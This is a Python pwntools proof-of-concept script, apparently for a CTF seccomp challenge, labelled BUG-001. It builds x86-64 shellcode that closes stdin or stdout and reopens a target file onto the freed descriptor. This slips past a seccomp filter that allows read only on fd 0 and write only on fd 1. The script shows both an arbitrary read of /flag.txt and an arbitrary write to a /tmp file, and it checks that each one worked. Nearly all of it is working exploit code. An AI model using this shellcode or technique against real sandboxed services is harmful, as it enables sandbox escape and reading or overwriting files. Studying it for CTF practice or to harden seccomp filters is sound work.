#!/usr/bin/env python3
"""
S3 Primitive Verification PoC for BUG-001: SECCOMP_SANDBOX_BYPASS_FD_REUSE

BUG: seccomp sandbox restricts read() to fd==0 and write() to fd==1,
     but close/open/openat are unrestricted. close(0)+open("/flag.txt")
     reuses fd 0 for the file, then read(0) reads file content,
     bypassing the fd==0 constraint. Similarly close(1)+open() reuses
     fd 1, allowing write(1) to write to an arbitrary file.

PRIM-001: ARB_READ (via seccomp fd-reuse bypass)
  - close(0) frees fd 0
  - open("/flag.txt", O_RDONLY) reuses fd 0
  - read(0, buf, n) reads file content (passes fd==0 seccomp check)
  - write(1, buf, n) outputs to stdout (passes fd==1 seccomp check)

PRIM-002: ARB_WRITE (via seccomp fd-reuse bypass)
  - close(1) frees fd 1 (stdout)
  - open("/tmp/s3_write_test", O_WRONLY|O_CREAT|O_TRUNC) reuses fd 1
  - write(1, data, n) writes to the file (passes fd==1 seccomp check)

This proves the seccomp sandbox's file access restriction is bypassable
in both directions: arbitrary file read AND arbitrary file write.
"""

from pwn import *
import os

context.arch = 'amd64'
context.os = 'linux'

BINARY = '/work/workspace/0016-2021-T3-seccomp1-20260908-133252/target'
FLAG_PATH = '/flag.txt'
WRITE_TEST_PATH = '/tmp/s3_write_test'

def build_read_shellcode():
    """
    PRIM-001: ARB_READ
    1. close(0)           -- free fd 0 (stdin)
    2. open("/flag.txt")  -- reuses fd 0 for the file
    3. read(0, buf, 0x100) -- read file content via fd 0 (passes seccomp fd==0 check)
    4. write(1, buf, n)   -- output to stdout via fd 1 (passes fd==1 seccomp check)
    5. exit(0)
    """
    sc = asm('''
        /* Step 1: close(0) - free fd 0 */
        mov rax, 3       /* SYS_close */
        mov rdi, 0       /* fd = 0 */
        syscall
        
        /* Step 2: open("/flag.txt", O_RDONLY) - reuses fd 0 */
        jmp get_path
    back:
        pop rdi           /* rdi = address of "/flag.txt" */
        mov rax, 2        /* SYS_open */
        xor rsi, rsi      /* O_RDONLY = 0 */
        xor rdx, rdx      /* mode = 0 */
        syscall
        
        /* Step 3: read(0, rsp-0x100, 0x100) - read file content via fd 0 */
        sub rsp, 0x100    /* make space on stack for buffer */
        xor rax, rax      /* SYS_read = 0 */
        xor rdi, rdi      /* fd = 0 (now the opened file!) */
        mov rsi, rsp      /* buf = rsp */
        mov rdx, 0x100    /* count = 256 */
        syscall
        
        /* Step 4: write(1, rsp, rax) - output to stdout */
        mov rdx, rax      /* count = bytes read */
        mov rax, 1        /* SYS_write */
        mov rdi, 1        /* fd = 1 (stdout) */
        mov rsi, rsp      /* buf = rsp */
        syscall
        
        /* Step 5: exit(0) */
        mov rax, 60       /* SYS_exit */
        xor rdi, rdi      /* status = 0 */
        syscall
        
    get_path:
        call back
        .ascii "/flag.txt"
        .byte 0
    ''')
    return sc

def build_write_shellcode():
    """
    PRIM-002: ARB_WRITE
    1. close(1)           -- free fd 1 (stdout)
    2. open("/tmp/s3_write_test", O_WRONLY|O_CREAT|O_TRUNC, 0666) -- reuses fd 1
    3. write(1, data, n) -- write to file via fd 1 (passes seccomp fd==1 check)
    4. exit(0)
    
    O_WRONLY=1, O_CREAT=0x40, O_TRUNC=0x200 => flags = 0x241
    """
    sc = asm('''
        /* Step 1: close(1) - free fd 1 (stdout) */
        mov rax, 3       /* SYS_close */
        mov rdi, 1       /* fd = 1 */
        syscall
        
        /* Step 2: open("/tmp/s3_write_test", O_WRONLY|O_CREAT|O_TRUNC, 0666) */
        /* O_WRONLY=1, O_CREAT=0x40, O_TRUNC=0x200 => 0x241 */
        jmp get_path
    back:
        pop rdi           /* rdi = address of path */
        mov rax, 2        /* SYS_open */
        mov rsi, 0x241    /* O_WRONLY|O_CREAT|O_TRUNC */
        mov rdx, 0x1b6    /* mode = 0666 */
        syscall
        /* rax = new fd (should be 1 since we closed fd 1) */
        
        /* Step 3: write(1, msg, len) - write to file via fd 1 */
        jmp get_msg
    back2:
        pop rsi           /* rsi = address of message */
        mov rax, 1        /* SYS_write */
        mov rdi, 1        /* fd = 1 (now the opened file!) */
        mov rdx, 22       /* count = length of message */
        syscall
        
        /* Step 4: exit(0) */
        mov rax, 60       /* SYS_exit */
        xor rdi, rdi      /* status = 0 */
        syscall
        
    get_msg:
        call back2
        .ascii "S3_ARB_WRITE_VERIFIED"
        .byte 0
        
    get_path:
        call back
        .ascii "/tmp/s3_write_test"
        .byte 0
    ''')
    return sc

def main():
    # Clean up any previous test file
    if os.path.exists(WRITE_TEST_PATH):
        os.unlink(WRITE_TEST_PATH)
    
    # ================================================================
    # PRIM-001: ARB_READ via seccomp fd-reuse bypass
    # ================================================================
    print("=" * 60)
    print("=== PRIM-001: ARB_READ via seccomp fd-reuse bypass ===")
    print("=" * 60)
    
    sc1 = build_read_shellcode()
    print(f"[*] Read shellcode length: {len(sc1)} bytes")
    
    p = process(BINARY)
    prompt = p.recvuntil(b'4096):', timeout=5)
    print(f"[*] Got prompt")
    
    p.send(sc1)
    
    try:
        data = p.recvall(timeout=10)
    except:
        data = p.recv(timeout=5)
    
    print(f"[*] Received {len(data)} bytes")
    print(f"[*] Output (hex): {data.hex()}")
    print(f"[*] Output (ascii): {data}")
    
    p.close()
    
    prim1_verified = b'test_flag' in data
    if prim1_verified:
        print(f"\n=== PRIM-001: VERIFIED ===")
        print(f"  read_value: {data}")
        print(f"  Method: close(0) + open('/flag.txt') reuses fd 0")
        print(f"  read(0) reads file content, bypassing fd==0 seccomp constraint")
        print(f"  write(1) exfiltrates content to stdout")
    else:
        print(f"\n=== PRIM-001: FAILED ===")
    
    # ================================================================
    # PRIM-002: ARB_WRITE via seccomp fd-reuse bypass
    # ================================================================
    print("\n" + "=" * 60)
    print("=== PRIM-002: ARB_WRITE via seccomp fd-reuse bypass ===")
    print("=" * 60)
    
    sc2 = build_write_shellcode()
    print(f"[*] Write shellcode length: {len(sc2)} bytes")
    
    p = process(BINARY)
    prompt = p.recvuntil(b'4096):', timeout=5)
    print(f"[*] Got prompt")
    
    p.send(sc2)
    
    # Give it time to execute
    import time
    time.sleep(2)
    
    try:
        out = p.recvall(timeout=5)
    except:
        out = b''
    
    p.close()
    
    # Check if the file was written
    if os.path.exists(WRITE_TEST_PATH):
        with open(WRITE_TEST_PATH, 'r') as f:
            written_content = f.read()
        print(f"[*] File {WRITE_TEST_PATH} exists!")
        print(f"[*] Written content: {written_content!r}")
        
        prim2_verified = 'S3_ARB_WRITE_VERIFIED' in written_content
        if prim2_verified:
            print(f"\n=== PRIM-002: VERIFIED ===")
            print(f"  written_value: {written_content!r}")
            print(f"  Method: close(1) + open('{WRITE_TEST_PATH}', O_WRONLY|O_CREAT|O_TRUNC) reuses fd 1")
            print(f"  write(1) writes to file, bypassing fd==1 seccomp constraint")
        else:
            print(f"\n=== PRIM-002: PARTIAL ===")
            print(f"  File exists but content doesn't match")
    else:
        print(f"\n=== PRIM-002: FAILED ===")
        print(f"  File {WRITE_TEST_PATH} was not created")

if __name__ == '__main__':
    main()
